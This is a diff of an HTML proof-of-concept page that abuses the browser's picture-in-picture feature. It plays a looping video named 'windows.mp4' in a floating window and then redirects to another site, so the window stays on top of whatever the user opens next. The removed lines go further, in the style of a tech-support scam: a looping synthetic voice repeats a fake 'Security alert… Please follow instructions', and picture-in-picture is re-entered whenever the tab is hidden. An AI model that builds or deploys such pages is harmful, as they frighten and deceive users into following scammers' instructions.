@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Persistent PiP + Audio PoC</title>
+<title>Video PiP Only PoC</title>
 <style>
   body { font-family: Arial, sans-serif; text-align: center; padding: 40px; background:#000; color:#fff; }
   button { padding: 15px 30px; font-size: 18px; cursor: pointer; }
@@ -12,82 +12,37 @@
 </head>
 <body>
 
-<h2>CLICK TO START</h2>
-<button id="startBtn">Start Video + Speech</button>
+<h2>CLICK TO START VIDEO</h2>
+<button id="startBtn">Start PiP Video</button>
 
-<video id="v" src="windows.mp4" controls playsinline></video>
+<video id="v" src="windows.mp4" controls playsinline muted></video>
 
 <script>
 const btn = document.getElementById('startBtn');
 const video = document.getElementById('v');
-let speaking = false;
 
 btn.addEventListener('click', async () => {
+
   btn.disabled = true;
 
-  // 🎬 Play video safely
+  // 🎬 Play video muted
   try {
-    video.muted = false;
-    video.volume = 1;
+    video.muted = true;   // suara dimatikan
     video.loop = true;
     await video.play();
   } catch(e){ console.warn("Video play failed", e); }
 
-  // 🖼️ Enter PiP safely
-  async function enterPiP() {
-    try {
-      if (document.pictureInPictureEnabled && !document.pictureInPictureElement) {
-        await video.requestPictureInPicture();
-      }
-    } catch(e){ console.warn("PiP failed", e); }
-  }
-
-  await enterPiP();
-
-  // 🔊 SpeechSynthesis loop persistent
-  const text = "Security alert. Suspicious activity detected. Please follow instructions.";
-  function speakLoop() {
-    if (speaking) return;
-    speaking = true;
-
-    const utter = new SpeechSynthesisUtterance(text);
-    utter.lang = 'en-US';
-
-    let voices = speechSynthesis.getVoices();
-    if (voices.length > 0) {
-      const enVoice = voices.find(v => v.lang.startsWith('en'));
-      if (enVoice) utter.voice = enVoice;
-      speechSynthesis.speak(utter);
-    } else {
-      speechSynthesis.onvoiceschanged = () => {
-        voices = speechSynthesis.getVoices();
-        const enVoice = voices.find(v => v.lang.startsWith('en'));
-        if (enVoice) utter.voice = enVoice;
-        speechSynthesis.speak(utter);
-      };
+  // 🖼️ Request PiP
+  try {
+    if (document.pictureInPictureEnabled && !document.pictureInPictureElement) {
+      await video.requestPictureInPicture();
     }
+  } catch(e){ console.warn("PiP failed", e); }
 
-    utter.onend = () => {
-      speaking = false;
-      speakLoop();
-    };
-  }
-
-  speakLoop();
-
-  // 🔁 Keep PiP alive on tab switch
-  document.addEventListener('visibilitychange', async () => {
-    if (document.visibilityState === 'hidden') {
-      await enterPiP();
-    }
-  });
-
-  // 🔀 Redirect ke target site tapi coba pertahankan audio PiP
+  // 🔀 Optional redirect
   setTimeout(() => {
-    const redirectUrl = "https://www.google.com";
-    // open in same tab (audio mungkin tetap jalan tergantung browser)
-    window.location.href = redirectUrl;
-  }, 3000); // 3s delay
+    window.location.href = "https://www.google.com";
+  }, 3000); // delay 3 detik
 });
 </script>
 
